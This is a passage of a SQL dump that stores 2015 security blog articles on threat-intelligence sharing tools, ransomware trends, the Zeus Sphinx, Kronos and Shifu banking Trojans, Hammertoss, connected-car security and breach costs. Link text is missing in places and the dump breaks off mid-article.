Different MISP instances can be connected to each other. This allows you to get threat information from other instances and then store that data locally, which ensures that the queries for information remain confidential and limited to your server.\n MISP foresees four community sharing models:\n X-Force Exchange uses the concept of collections, which are sets of information related to an investigation. Users can aggregate different observables and/or indicators in a collection and then share that with as many users as they wish. These users can either be viewers only or a combination of viewers and contributors. Collections can also be private or public.\n This doesn’t completely correspond with sharing under the different TLP restrictions or with the community sharing model of MISP, but it does allow fine-grained filtering of who can access your data.\n Both solutions have support for STIX. X-Force Exchange supports STIX and TAXII both via an application programming interface (API) and the Web user interface. It has the capability to import and export STIX documents into and out of a collection. MISP supports exporting data in TAXII format.\n Most users will interact with these two platforms via the Web interface, but this isn’t the optimal way to integrate with your existing infrastructure.\n Both solutions provide an API to overcome this problem. The API is necessary to automatically update your security devices (IDS, SIEM, etc.) with the latest available information.\n The   provides a secure, RESTful, JSON-based API that supports both public and authenticated queries. You can write your own module to access the API or use one of the projects that already exist on Github, such as  ,   or  .\n MISP also has a RESTful, JSON-based API that can be used for automation and feeding your devices. There is a Python library,  , developed by CIRCL that allows easy access to the API.\n Threat intelligence sharing is not something revolutionary, but it’s definitely something you should consider if you want to stay on top of what threats can endanger the security of your IT environment.\n MISP is very strong when it comes to building a central indicators of compromise database containing both technical and nontechnical information. Meanwhile, the Web version of X-Force Exchange provides a much slicker interface for viewing trends and ongoing threat activity, giving you an immediate view on what’s happening.\n The different tools available for sharing threat intelligence do not exclude each other. It’s perfectly normal to acquire both on-premises and cloud-based solutions and then choose, depending on the type of threat information you are dealing with, where to store the information.', '\'Advanced Persistent Threat (APT)\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/comparing-different-tools-for-threat-sharing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (340, 'Ransomware Evolves and Enjoys a New Playground', 'Chris Poulin', '2015-10-7', 'Ransomware has worked for cybercriminals for many years, and it continues to be a valuable tool in their arsenal. A   discussed the trend of attackers reverting to older techniques to deliver ransomware to the employee endpoint. But now it’s time to look ahead at the future of ransomware. A good place to start when predicting the future of ransomware is the broader history of malware in general. In light of the way malware has evolved, especially in recent years, the clear next step is likely for ransomware to become situationally aware. Dyre, first discovered in 2014, is a perfect example of a malware that started out as a simple banking Trojan and then quickly developed situational awareness — which led to its becoming substantially more dangerous Earlier this year, IBM was a key player in identifying a new tactic, which we called  . Marking a significant break with previous encounters with Dyre, the Dyre Wolf attacks included a social element in which users on an infected endpoint would visit a particular website and get an error message instructing them to call their bank to verify certain personal details. In reality, the message was provided by the attackers and led victims directly to them. The evolution from Dyre to Dyre Wolf reveals that malware authors and attackers are no longer satisfied with sending out a phishing email and capturing the credentials of 1 or 2 percent of its recipients. Instead, they are developing more sophisticated tools and social engineering tactics to ensure they can target not only key organizations, but key individuals within those organizations. When an enterprise gets infected by ransomware today, it has to pay the going rate to get its information released. A mom-and-pop shop that gets infected pays, say, $700 per item to have its data released; a Fortune 100 company that gets infected has to pay that same $700. Right now that number is identical, but clearly the capacity to pay is much larger in a corporate environment than it is in a two- or three-person small business. This is an area in which more situationally aware ransomware could wreak havoc. \n Given its past success, traditional ransomware seems destined to continue to thrive on unprotected  . It may even become more lucrative by incorporating social engineering and other advanced attack methods. Ransomware will likely also look to new playing fields such as the Internet of Things (IoT). When discussing the security of connected cars, for example, the focus is usually on data protection, privacy or, of course, physical safety. But there’s no reason to think new types of ransomware schemes won’t play a role here, as well. If attackers do manage to hack an  , they could potentially take control, brick the engine and demand a ransom of, say, 10 or 20 bitcoins to release the car. Such a scheme would be relatively easy for a cybercriminal with the right tools and simultaneously disastrous for victimized individuals, organizations and economies. In terms of general malware trends but also specifically with ransomware, we see a lot of generic malware out there, but we also see some malware that very clearly is trying to stay ahead of the pace of our existing network tools and even new tools that are being developed. This has been the case for 10 or even 15 years, and it’s not likely to change. In such an environment, a successful organization is one that doesn’t rely exclusively on security tools, but rather has a proactive mindset when it comes to protecting assets. If you’re not threat hunting and proactively preparing for a potential security event, you’re setting yourself up for a rude awakening. You do want to continue to build up your castle wall to keep threats out, but it’s also crucial to plan your response for dealing with ransomware and any other threats that manage to get in.', '\'Banking Trojan\', \'Dyre\', \'Dyre Wolf\', \'Internet of Things (IoT)\', \'Malware\', \'Phishing\', \'Ransomware\'', 'https://securityintelligence.com/ransomware-evolves-and-enjoys-a-new-playground/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (341, 'UK Banks Hit With New Zeus Sphinx Variant and Renewed Kronos Banking Trojan Attacks', 'Limor Kessem', '2015-10-2', 'Two recent discoveries by IBM Security X-Force researchers indicate that the U.K. is seeing an increased wave of banking Trojan attacks from two families linked with the Zeus Trojan: Sphinx and Kronos. In the first case, X-Force researchers are the first to confirm that beyond seeing underground posts of cybercriminals selling a new Zeus variant dubbed Sphinx, this malware actually exists and is actively attacking banks in the wild. Sphinx is commercial malware that is sold to anyone who will pay for it, which means its targets can vary quite a bit. The most current identified configuration is targeting several major U.K. banks and one Polish bank. IBM Security X-Force’s analysis of Sphinx shows it is, for the most part, a replica of Zeus v2 variants. The second case has to do with the  . Kronos is a known banking malware threat that emerged in mid-2014. Surprisingly, this malware has gone silent for the past few months and has just reemerged, showing no technical advancements but a change in turf that focuses on U.K. banks and one bank in India. The U.K. is, and has been for many years, a preferred target for cybercrime because of its prosperous economy and strong adoption of Internet-based services for banking and payments. While the U.K. is already the most targeted area for banking Trojan malware configurations (per IBM Trusteer data), the past few months have shown more activity than usual. Banking Trojans such as  , Zeus Sphinx and Kronos are configured to launch into action upon access to consumer, corporate and even wealth management accounts. This post brings more information about Zeus Sphinx and Kronos, both of which are current threats that are trending in the global cybercrime arena. \n Zeus Sphinx is crimeware that emerged in underground fraud forums in late August 2015, offered for sale by a Russian-speaking vendor for $500 per binary — without a malware builder. This means that Sphinx’s vendor is not enabling fraudsters to independently generate new malware files. Fraudsters would have to buy a new variant generated by the vendor every time their current one gets detected as malicious by signature-based security solutions. In a post selling Sphinx to other cybercriminals, its vendor indicated the malware communicates via the anonymizing  , making it harder to sinkhole, avoiding IP address-based blacklisting and keeping it off ZeusTrackers. Zeus Sphinx is used for the theft of online banking authentication elements such as user credentials, cookies and certificates. These elements are subsequently used by fraudsters in illicit online transactions typically performed from the user’s own device. Connection to the endpoint is facilitated via backconnect hidden virtual network computing (VNC), which means the infected endpoint will initiate a remote-access connection to the criminal’s endpoint. This feature allows the attacker to gain user-grade access to the device even through firewall protection. In most cases, Sphinx is configured to only harvest username and password combinations from the victim, both in a generic manner and when triggered by the websites users visit. The fraudsters that use this minimal configuration to test attack possibilities may be using the basic authentication or simply selling the harvested data to other criminals. In some of the cases, Sphinx was specifically configured to further deploy webinjections with social engineering content designed to lure victims into divulging two-factor authentication (2FA) codes generated by a card reader. Sphinx-enabled fraudulent transactions typically originate from the victim’s endpoint via VNC connection; this tactic is used in order to bypass device fingerprint-based security features. While this Trojan can be sold to anyone — and thus configuration file contents can differ very much from one another — current variants of Sphinx target banks in the U.K. and Poland, as well as a popular online payments system.  from the vendor’s post advertising Zeus Sphinx (originally in Russian) claim it has the following malware features: The vendor’s post was simultaneously found in the underground by a few intelligence analysts, including IBM Security X-Force researchers, but at that time no security vendor was able to confirm that Zeus Sphinx was real or active in the wild. This has now officially changed. By mid-September 2015, X-Force researchers found an actual Sphinx sample in the wild and confirmed that Zeus Sphinx not only exists, but is actively attacking online banking customers. Analysis of the Sphinx variant shows that the malware indeed features the same installation flow as typical Zeus v2 variants, writing itself to the Application Data folder and establishing persistence via  . The configuration file is stored in the Windows Registry using randomized file names. Sphinx captures GET/POST requests by hooking the   process. Unlike Zeus, this method resembles the Gootkit Trojan’s way of grabbing user credentials on the fly. Sphinx also sports the Zeus PHP botnet classic control panel interface. When browsing their bank’s website, Sphinx’s webfakes redirection scheme seamlessly sends victims to a phishing page without seeing the URL change. Each client-side bot is designed to deploy with the minimal user privilege level; each user on the same endpoint can be attributed a different bot ID. The author of the Sphinx variation has made sure to protect botnet communications with a unique encryption key. Traffic is encrypted with a self-signed SSL certificate in the same manner used by malware such as Dyre and Shifu. Right around the same time that Sphinx materialized and Shifu set its sights on the U.K., the Kronos banking Trojan returned from a hiatus, switching its configuration triggers to a list that distinctly focuses on U.K. banks. In a rather unusual occurrence, Kronos went silent for the past few months, shutting down the command-and-control servers that communicated with its infected botnets. As of September 2015, this has changed. Someone on the Kronos server side has flipped the lights back on, reconnecting with infected bots and sending them a brand new configuration file — only this time, it is attacking U.K. banks as well as one bank in India. \n Kronos, banking malware named after the father of Zeus, emerged in underground cybercrime boards in  , when it was offered for sale by a Russian-speaking vendor to the cybercrime community for a whopping $7,000. At first, there was no actual proof that the malware was indeed active in the wild, but by July 2014 it was clear that Kronos was primarily attacking banks in France. Kronos samples analyzed by X-Force researchers in 2014 confirmed that the malware was a user-mode rootkit that could hook popular browsers, featuring the typical Trojan mechanisms designed to facilitate online banking fraud. Some of those features are: New post-hiatus Kronos samples seem to operate in the exact same manner as they did before, indicating that the malware was not retired for development purposes. This is rather logical since Kronos is a commercial offering; it is therefore possible that its current operators are not actual developers who regularly make changes to their code to keep it stealthy over time. For Kronos, the only behavioral change observed by IBM X-Force researchers is an unexpected crash of the Chrome browser on machines infected with the malware. This issue can stem from a difficulty Kronos may have with injecting into Chrome, making it crash accidentally. Or it could be deliberate in order to force infected users to browse via IE or Firefox, where all its webinjections work properly. On top of changing its target list to focus on the U.K., Kronos’ new configuration includes more strategic updates, including elaborate webinjection schemes for some of the banks it targets. In new phishing-type injections, Kronos displays completely new Web pages to its victims, aiming to harvest their online banking credentials, telephone banking passwords and credit card information. At this time, Kronos is after personal banking accounts, likely spreading via email spam. Fighting emerging threats like the Zeus Sphinx Trojan or evolving threats like Kronos is easy with  . With protection layers adapted to the ever-changing threat landscape, financial organizations can gain access to a malware intelligence network that provides real-time insight into fraudster techniques and capabilities.', '\'Banking Trojan\', \'Cybercrime\', \'IBM X-Force Research\', \'Kronos\', \'Shifu\', \'Trojan\', \'Webinjection\', \'X-Force\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/uk-banks-hit-with-new-zeus-sphinx-variant-and-renewed-kronos-banking-trojan-attacks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (342, 'Ransomware Goes Back to the Future', 'Lance Mueller', '2015-9-30', 'As a senior incident response analyst for  , I’ve got a front-row seat to observe the latest trends in cybercrime and  . Any organization that experiences a breach or other security incident can call our hotline for help. Over the past six months we’ve seen a huge uptick in the number of calls concerning ransomware. Lots of organizations are getting hit with it, and it’s interesting because, like distributed denial-of-service (DDoS),   is generally considered to be an old-school style of attack. Some of the technologies used in today’s attacks may be new, but the vectors employed to actually deliver the malware are not dissimilar from the techniques of the late 1990s. For example,   have experienced a huge resurgence as a way for cybercriminals to infect targeted endpoints. Macro viruses and malware have been around for years, but in the face of newer and more advanced threats, they’ve actually fallen off the map a bit. In many instances, Word documents and PDFs have completely dropped off the syllabus of organizations’   programs, where the focus has shifted to zip files and executables as the primary potential threats. I can’t enter the mind of the attacker to say exactly why they’re reverting to these old methods, but we have to admit it does make some sense. Word documents and PDFs are used so commonly by most organizations that employees don’t even consider they might be weaponized. The lack of user education on the topic just gives attackers an extra edge. So let’s say an employee who receives multiple Word docs every day and is not trained to treat them with suspicion happens to access one that’s weaponized with a macro that fetches an encrypted payload. Something like an SSL gateway would see the traffic but can’t decrypt it, and so it comes across the network and reaches the endpoint. Then the code in the macro decrypts the malware, drops it, and now it’s on the endpoint. The only chance left is for your antivirus solution to pick it up. If that doesn’t happen, then the malware has free rein inside your environment. This renaissance of old-school tactics is affecting a growing number of companies and bringing difficult business decisions to the fore. Getting hit by CryptoLocker or other ransomware, especially when it   files on your network share, is devastating and can slow business to a standstill. One interesting related phenomenon we’re seeing is that many organizations that suffer a ransomware attack realize that the incident response processes they had in place are not adequate. In other words, the incident response plan that’s been on the shelf for two years has never been updated and is now revealed to be antiquated or broken. Or maybe the company just didn’t do a good job of following the plan because they had never rehearsed. Getting hit by ransomware can be a painful lesson: Many of us are not as prepared as we think we are. An additional consequence of not maintaining an up-to-date   may be discovered when an organization decides to try to avoid paying the ransom by turning to backups. Even if you are performing back-ups every week, if you aren’t regularly testing to make sure your critical data is actually being copied and stored as necessary, in the end there may be no choice but to pay up. The bottom line is ransomware is working. As long as it continues to make money for attackers, it will exist. But while today’s cybercriminals are reverting to the past when choosing their attack methods, your organization’s best hope is to make sure you have effective incident response processes that look to the future.', '\'CryptoLocker\', \'Cybercrime\', \'Endpoint\', \'Endpoint Security\', \'IBM Emergency Response Services\', \'Incident Response (IR)\', \'Malware\', \'Ransomware\'', 'https://securityintelligence.com/ransomware-goes-back-to-the-future/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (343, 'Shifu Officially Spreads to the UK: Banks and Wealth Management Firms Beware', 'Limor Kessem', '2015-9-28', 'Less than a month after Security Intelligence announced the discovery of the brand-new and highly advanced  , our predictions materialized and the malware has spread from Japan and begun actively attacking U.K. banks and wealth management firms. Shifu, which is suspected to have been created by Russian-speaking malware authors, only targeted 14 Japanese banks at the time of its discovery and also focused on a select set of electronic banking platforms used across Europe. However, due to the threat’s level of sophistication, IBM Security X-Force researchers predicted it would spread into new territories in the near future. As of Sept. 22, that prediction is a reality, with the U.K. receiving its very own Shifu configuration with 18 new targets. \n X-Force researchers confirmed that Shifu is actively attacking online banking customers in order to perform fraudulent transactions. The Shifu Trojan may be new crimeware, but its inner workings are not entirely unfamiliar. The malware relies on a few tried-and-true Trojan mechanisms from other infamous crimeware codes. It appears that Shifu’s internal makeup is being composed by savvy developers who are intimately familiar with other types of  . Beyond dressing Shifu with select features from the more nefarious codes known to information security professionals, these developers are already working on internal changes to Shifu. These are designed to ensure the Trojan’s security evasion mechanisms continue to perform. For example, in its new, U.K.-dedicated samples, Shifu no longer injects into the explorer.exe process. Rather, it has modified its action path to launch a new svchost instance and performs all actions from that process instead. Shifu began spreading to U.K.-based endpoints in mid-September 2015, with a few machine infections per day. By Sept. 22, it became clear that an actual infection campaign was taking place and hundreds of endpoints were infected per day. Although one relatively modest campaign has already taken place,   researchers believe more widespread infection sprees are yet to come in the U.K. This is likely to be followed with future propagation into other parts of Europe and the U.S. To infect users, online banking and wealth management customers are being led to poisoned websites hosting the   (EK), likely through links in email spam. The Shifu crew uses the Angler EK, a commercially available kit sold in the cybercrime underground. This kit emerged in 2013, quickly gaining momentum as an alternative to the infamous BlackHole EK, whose vendors were arrested that year. Angler is rather diverse and effective since it exploits a variety of different code vulnerabilities, including HTML, Java, JavaScript, Adobe Flash and Silverlight, to name a few. Although Angler is used by many cybercriminals, they all rely on its ability to evade security mechanisms and its multistep attack technique. To keep automated security off its tracks, Angler attacks are based on a redirection scheme that begins with a clean page or advertising banner and eventually lands on an Angler-poisoned page. The victim’s endpoint is then scanned for the corresponding vulnerabilities, followed by exploitation and the eventual payload drop. As more information about the evolution of the Shifu Trojan develops, be sure to check back for updated findings and reports.', '\'Advanced Threats\', \'Banking Trojan\', \'Financial Industry\', \'Financial Malware\', \'Malware\', \'Online Banking\', \'Shifu\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/shifu-officially-spreads-to-the-uk-banks-and-wealth-management-firms-beware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (344, 'Hammertoss: What, Me Worry?', 'David Strom', '2015-9-28', 'Earlier this year, a Russia-based hacking group  , a very nasty piece of malware that makes use of Twitter and Github to transfer its attack payloads and hide from view. Because it uses these common sites that are visited by millions, the notion is that its network traffic patterns are normally hard to detect since the traffic looks like ordinary end user queries of these services.\n But hidden in these interactions are the directions for the   to first download an image from Github, extract encrypted instructions and then finally upload a victimized PC’s data to its servers. While each of these techniques isn’t new, the combination shows that someone with a great deal of skill has taken the time to craft the code. For example, Hammertoss is able to:\n  explained how Hammertoss operates with Twitter, Github and other images.\n “Each Hammertoss-created tweet is custom-tailored with a unique hashtag and a URL that links to a seemingly innocuous image,” Charles Pulliam-Moore wrote on the site. “In reality, the image itself contains a small bit of encrypted data. The hashtag tells a computer where to look for the image and includes a matching bit of encrypted data that, when combined with the image, unleashes a new set of malware commands that can extract data from a compromised computer.”\n One security researcher has tracked the origins of Hammertoss to the  , which allegedly has nation-state ties. The group operates during the appropriate time zones and local Russian holidays, supporting this hypothesis.\n What can IT departments do about Hammertoss, given this profile? First, they should employ a security product that can examine   that it produces and look for unexpected behavior. While Hammertoss connects to random   and Github accounts, it is using the information gleaned from these accounts in an automated and programmatic fashion.\n Second, part of this analysis is also examining more carefully what kinds of data are leaving your network; if you don’t have any way to do this, now is the time to start looking at protective tools that will allow for this kind of monitoring. Third, you should look at security products that examine file integrity and movement specifically. Finally, you should probably subscribe to several   to keep up to date on the news about Hammertoss and other similar advanced threats.', '\'Advanced Threats\', \'Malware\', \'Network Security\', \'Security Intelligence\'', 'https://securityintelligence.com/hammertoss-what-me-worry/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (345, 'High-Impact Security Flaws and Why They’re Still Being Overlooked', 'Kevin Beaver', '2015-9-24', 'Can you honestly say you understand your existing security posture? Many people, especially those in management, are quick to proclaim that no flaws exist; all is secure in their world because their auditors have said they’re compliant with whatever regulations or they passed their most recent spot check. But the   is telling us something different. Day after day, it seems, more breaches are occurring — all because of basic security flaws that could easily be prevented.\n Today’s breaches are bigger, but they’re not necessarily more advanced. It seems that every major exploit is brought about by someone, somewhere, overlooking  . This includes:\n I see these flaws in hospitals,  , cloud service providers, state government agencies, manufacturing companies and seemingly every type of business in between. It’s not because I’m a security wizard with ninja-like skills. Instead, it’s because these problems are there, and I know where to look. They’re predictable and they’re everywhere. From large enterprises to small startups, these basic flaws (also known as the low-hanging fruit) know no limits, and continued research such as the   and ongoing studies from the Ponemon Institute, among others, underscores these very issues.\n Former IT executive James Champy once said, “Many executives are insulated from reality and consequently don’t know what the hell is going on.” I think this pretty much sums up the disconnection between IT and security teams and management.\n Even with all the regulations, governance and lip service given to security in 2015, we still have these problems. Why, though? I know that most people in IT and security are doing the best they can with what they’ve got. Likewise, outside of the occasional IT leader  , I think executive management — even non-IT types — are doing the best they can to run the business. Yet the security basics are ignored and the breaches continue.\n When are things going to change? What’s it really going to take to find, fix and prevent simple security flaws from creating such complex business problems? Is self-preservation and career perpetuation going to continue to drive decisions for some? Will   too much? Will users continue to do what they do?\n No one knows the answers to how we’re going to minimize the challenges that are often politically induced. At least we do know the answers to the technical and operational side of things. Many such solutions are contained in the great book “ ” by James Martin, which happened to be published over four decades ago.\n As Ayn Rand, author of “Atlas Shrugged” and other works, said, “We can evade reality, but we cannot evade the consequences of evading reality.” The real solution is for those in leadership and decision-making positions to do what’s right and keep doing what’s right. Perhaps eventually things will come around. Whether or not they do, there’s lots of job security to go around. As long as you’re doing what you can to minimize your maximum regret — the seemingly   — I think you’ll be just fine.', '\'Chief Information Security Officer (CISO)\', \'User Education\', \'Vulnerabilities\'', 'https://securityintelligence.com/high-impact-security-flaws-and-why-theyre-still-being-overlooked/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (346, 'Connected Cars: Safe to Drive, Safe to Own', 'Gavin Kenny', '2015-9-17', 'A modern car is a wonderful piece of engineering. Even at its most basic, these vehicles provide levels of road holding, economy, safety and comfort that make their predecessors of only a decade ago seem like tractors in comparison. While a modern car’s performance is miles ahead of its forebears, manufacturers know that they cannot rest on their laurels. They must continue to push the boundaries of road holding, power, performance and economy in order to survive in the highly competitive car market. The market continues to develop, but the discerning customer always wants more. Now we want connected cars that integrate with our own personal IT infrastructure, talk to our   and communicate with other systems in order to enhance the driving and ownership experience. This connectivity represents its own unique challenges, and until recently, a vehicle had been its own island: It was controlled both physically and electronically by the people inside it. The   is no longer an isolated node but part of a larger web of devices, sharing information about itself and its occupants.   estimated that by 2020 a single connected car will generate 350 MB of information every second! Traditional component suppliers have to move quickly in order to continue development and become major players in the connected car supply chain. Already, nontraditional manufacturers such as Apple and Google are looking to move into this sector, and history tells us they have an ability to innovate and maintain a presence in new markets. However, our own experience tells us that the mainstream software development culture is very different from its industrial brother. One is innovative, functional and changes constantly, but has had a checkered past in terms of reliability and security; the other is stable and reliable, but is based on older technology that now has a questionable security record. So what does a car manufacturer do? Customers demand the latest refinements in connectivity, so new levels of reliability and monitoring are made possible through data links. But these features leave vehicles vulnerable to attack. We cannot have a car that needs to reboot at 60 mph or that can be hacked by someone who takes over control of the brakes and steering while we’re driving. The security challenge doesn’t stop there. As the car becomes embedded in our personal data network, it has access to vast amounts of our personal information — making it even more attractive to attackers. It is imperative that the vehicle has a security architecture that is robust, flexible and able to adapt over the life of the automobile. To achieve this, manufacturers either need to invest large sums of money in an area completely outside their core skill set or work with a partner. But which partner should they choose? To me, the answer seems obvious. The enterprise sector has the ability to innovate while delivering the kind of reliability that is so important. Enterprise systems process petabytes of data every day but at the same time are agile enough to adapt to constantly changing requirements. They achieve this by using proven design techniques and software frameworks that have levels of rigorous testing to ensure quality and consistency. These players need to bring their experience and expertise to the   to deliver the levels of security, reliability and new functionality that will allow the connected car to reimagine our driving experience. At  , IBM is demonstrating its Automotive for IoT solutions, which can transmit vehicle data, monitor vehicle health and analyze driver performance and maintenance needs. Visit us at   in the New Mobility World or join in the @IBMAutomotive conversation using the hashtag #DrivingSecurity.', '\'Automotive Computing Systems\', \'Automotive Industry\', \'Connected Vehicles\', \'Google\', \'Internet of Things (IoT)\', \'Security Intelligence\'', 'https://securityintelligence.com/connected-cars-safe-to-drive-safe-to-own/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (347, 'Forecasting a Breach Is Like Finding a Needle in a Haystack — Not That Tough', 'Rick Robinson', '2015-9-16', 'This year has seen plenty of breaches, and it’s not even over yet. Numerous reports show that the number of breaches in 2015 has rivaled 2014, but not many of them are making the evening news — other than the recent hack of   — because breaches are sadly becoming commonplace.\n According to Experian’s “ ,” breaches will likely continue to focus on payment systems, but the accelerated adoption of chip-and-PIN technology is thwarting the traditional exploits for collecting and monetizing credit card data. As a result, Experian suggested thieves will look elsewhere for fertile ground — the cloud, health care information and the Internet of Things (IoT).\n The   reported that as of Sept. 1, 533 breaches have occurred in 2015 and that over 140 million records have been exposed across business, educational, government and health care sectors. That represents about 44 percent of the population of the U.S. — and it means that if you have a credit card, Social Security number or password, your information has probably been compromised in one or more of the breaches.\n  released a study reporting the cost of a breach to enterprises is up in 2015. The total cost increased 23 percent over the past two years to just under $4 million.\n Although the average cost of a breach may be around $4 million, the little-known secret is that the actual liability organizations agree to provide when protecting data in the cloud is much higher. In other words, organizations that host or store customer information are going to be held liable in the event of a data breach, and the associated costs are potentially more severe.\n Customers may ask that the liability an organization is willing to cover exceeds $100 million, which is catching the eye of the top-level executives and their boards. It’s a huge financial risk to any organization, and I am certain it begins to raise questions about the benefit of storing customer data, approaches to protecting that data and the methods of mitigating the risk of a breach of the data.\n Are you willing to say that your infrastructure and processes around your security are so refined that you will compensate your customers up to $100 million in the event that their data is compromised by a breach?\n We have now disclosed the average cost of breach in 2015 and provided a peek at the level of liability that organizations may be asked to provide. But how realistic is this in today’s security environment? Specifically, how likely is it that a weak point is found and exploited?\n Each organization is different, but if you are an enterprise storing data worth stealing (and you know who you are), you can expect to see exploit attempts to the tune of approximately 1 million attempts per hour. That’s a lot of villains at the gate, and it only takes one to get through before the rest quickly follow.\n Or course, most — if not all — of those attempts are automated. Infected hosts on the Internet are constantly scanning the Web, testing ports, attempting logins, trying different passwords, changing their patterns, incorporating the latest exploits and achieving goals very efficiently and from a centralized command-and-control infrastructure that is both difficult to find and more difficult to dismantle.\n Furthermore, how do you know if cybercriminals are just testing the front door or if they are actually exploiting a vulnerability? That is the proverbial needle-in-a-haystack question.\n How do you find a needle in a haystack? It is really not that difficult. I would use 1,000 people with hand magnets or one of those massive magnets you see used to pick up cars in junk lots. You could also use an X-ray, MRI or CAT scan.\n Sound a little unconventional? Yes, I know, but get used to it! We need to think outside the box and outside the haystack.\n Technology provides the villains an advantage to find and   very efficiently, but we have the advantage that we can use the same and even newer technology to find the needles and remove them prior to any exploitation. However, it requires us to work collectively and intelligently.\n I indicated that one approach to finding the needle is to give magnets to 1,000 people. Let’s extend that concept. Let’s give magnets, X-rays and CAT scan and MRI equipment to 1,000 people and then correlate all the data to find the needle. Aside from some of the scalability and expense issues of this approach, we all agree that finding the needle using an approach like this actually becomes quite easy.\n So how do we take this concept and move it into the space of vulnerabilities, risk management and breach containment? That, too, is easy.\n Earlier this year,   that it is opening up its threat intelligence vaults to combat cyberattacks. The   is designed for companies to work together against cyberattacks by sharing information. Through this social platform, we work as one. It’s us against them through sharing information and insights, working collectively and efficiently, leveraging the intelligence of others and staying ahead of the villains at the gate.\n X-Force Exchange addresses the ability to work together, but how do we know what information can tell us if there is a breach or potential breach? The answer is through correlation. The massive volume of attempts to breach our fortress of data protection actually has a silver lining.\n We know that if there is a potential weakness in our systems, cybercriminals will attempt to exploit it. Using a collection of information from our SIEM systems, logs, forensics investigations, vulnerability scanning and network topology, we can correlate information to help us see not only if there is a vulnerability, but also if there is traffic on our network that is attempting to exploit other weaknesses.\n The villains provide us with the stimulus that we can easily and automatically monitor and use against them. Combining their activities with the other information from your   provides automated and comprehensive insight into the true risk of a breach on your network, whether it is on-premises or in the cloud.\n Forecasting a breach follows a corollary to a quote from Willie Sutton, the prolific American bank robber. When he was asked why he robbed banks, he said, “Because that’s where the money is.” So by extension, if we want to know where the villains are, we can answer that it’s where the potential vulnerabilities exist.\n If traffic on a port, network segment, server or application is unusual or is correlating to another change to your assets or network configuration, it should go right to the top of your action items for immediate investigation. If traffic to or from an application has historically been blocked, such as a music service, website or social network, but is now available, that should be an indication that you should investigate that change — and quickly. To make it easier, if your peers tell you about their discoveries and observations in changes in malicious traffic, that can even give you an advantage prior to any notable changes in your particular network.\n All of this comes down to security intelligence: correlating a lot of information automatically, sharing that information and working together with your peers.\n It makes needles much easier to find.', '\'Cost of a Data Breach\', \'Data Breach\', \'Information Sharing\', \'Security Intelligence\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/forecasting-a-breach-is-like-finding-a-needle-in-a-haystack-not-that-tough/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (348, 'The Myth of Stock-Busting Breaches', 'Pamela Cobb', '2015-9-15', 'The security industry likes to tout the horrible fates that befall companies under cyberattack. We pepper our marketing with flair like cybercriminals in   and “it’s not if, it’s when.” It seems like every single breach and malware discovery is worse than the one before it, so every day we fight the cybercriminals is the worst day ever. To paraphrase the movie “Office Space,” the industry has a case of the Mondays when it comes to cybersecurity. When we have studies that show the actual   is in the millions of dollars for companies, is the myth of the stock-busting breach true? What is the impact on top-line growth and stock performance? As you may have surmised from the title, major breaches don’t always mean major loss in market cap. Let’s look at four breach examples from the last few years: Let’s set the day before their public disclosure of the breach as day zero. Each of these companies disclosed publicly on different days, and they all had different starting stock prices. To show them on a consistent timeline with relative measures, I’ve set their day zero   as their base and looked at fluctuations as a percent change to that price. Since Company A’s breach occurred when multimillion-record leaks weren’t quite so common, we would expect to see a big dip in their stock performance after the announcement. Based on Figure 1 below, we see the company’s stock price dipped almost 12 percent about seven weeks after the breach was made public. In this particular instance, that coincided with an SEC filing that disclosed additional details about the incident, but the stock had been on the decline even before that formal disclosure. Although the stock appears to rebound about six months after the disclosure, to get all our paperwork and TPS cover sheets in order, we’ll compare it to one of the major stock indices, the Dow Jones Industrial (DJI). I use the DJI because this example is a U.S.-based retailer that trades primarily in the U.S. stock exchange, and we know that general market performance can particularly impact the performance of consumer-based industries like retail. Using the same timeline and relative stock performance from day zero for the DJI, we can see that the market managed to grow over that six-month period following the disclosure, when the clothing retailer’s stock did not. We can’t entirely blame the stock performance on the breach disclosure, but we’ll keep this example in mind as we move on to more recent incidents. Adding in the three more recent breach victims to the relative stock price chart, we see mixed results. In some cases, like the entertainment company and the home improvement retailer, the stock prices rebounded and grew over 20 percent from before their disclosure in the six months following. In others, like the homewares retailer, prices remained slightly down. Myth: not confirmed. So many factors can affect stock price, but let’s focus on a more personal level. For the executives in charge at the time of the incident, the chaos of disclosure and remediation is the top priority, and the dust appears to settle around three to five months after disclosure. Adding in changes to the executive staff — mostly in the CIO or CISO role — to the stock performance graph above draws out a couple things of note.  The relative change in stock price for Companies A, B, C and D compared, displaying notable changes in executive staffing. In three of the companies, executive changes followed the disclosure, compared to half of the companies suffering in stock price. Granted, it’s a small sample size, but three-quarters is still statistically significant for the executive affected. The second thing to note is that the announcement of the staffing changes didn’t affect the stock price significantly. Market confidence, as reflected in stock price, was not impacted by the public scapegoating of a particular executive. The stock price for the entertainment company and the homewares retailer did not change drastically in the four weeks between the resignation announcement and the new hire announcement of the CIO role. The stock data busts the myth that a major breach means major loss of market capital or top-line growth. Despite potential lawsuits from affected customers, investigation and cleanup costs and brand repercussions (particularly if the affected company touts secrecy as a core tenant, as in one recent breach), companies are still rolling the dice on their security posture since a lot of the long-term repercussions for a breach are relatively nebulous. In looking at the SEC filings of the various companies I’ve cited as examples, we can certainly quantify some of the hard dollar costs reported as pretax gross expenses. In addition to hard costs, a U.S. appellate court reaffirmed that the U.S. Federal Trade Commission (FTC) has the authority to   if it deems those companies engaged in unfair or deceptive practices that led to the breach. The outcome doesn’t necessarily mean more 